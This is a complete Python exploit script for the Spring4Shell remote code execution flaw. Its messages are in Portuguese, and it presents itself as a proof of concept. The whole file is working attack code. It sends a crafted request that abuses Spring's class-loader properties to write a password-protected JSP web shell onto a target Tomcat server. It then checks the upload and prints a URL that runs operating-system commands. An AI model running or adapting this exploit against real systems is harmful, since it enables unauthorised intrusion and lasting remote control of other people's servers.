#!/usr/bin/env python3
# Spring4Shell
# Exploit Original: https://github.com/BobTheShoplifter/Spring4Shell-POC/

import requests
import argparse
from urllib.parse import urljoin

def exploit(url, filename, password, directory):
    headers = {"suffix":"%><!--//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"
    }

    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{password}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/{directory}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="


    try:
        requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellurl = urljoin(url, f"{filename}.jsp")
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"Upload da shell realizado com Sucesso!\nSua webshell pode ser encontrada em: {shellurl}?pwd={password}&cmd=whoami")
        else:
            print("Exploit falhou")
    except Exception as e:
        print(e)
        pass




if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Spring4Shell RCE Prova de conceito')
    parser.add_argument('url', help='passe a URL completa do alvo http://alvo/')
    parser.add_argument("-f","--filename", help="Nome do arquivo da shell (Default tomcatwar.jsp)", default="tomcatwar.jsp")
    parser.add_argument("-p","--password", help="Senha que protege a shell (Default: icts)", default="icts")
    parser.add_argument("-d","--directory", help="Fazer o upload do arquivo no diretorio raiz (Default: ROOT)", default="ROOT")
    args = parser.parse_args()
    exploit(args.url, args.filename.split(".")[0], args.password, args.directory)
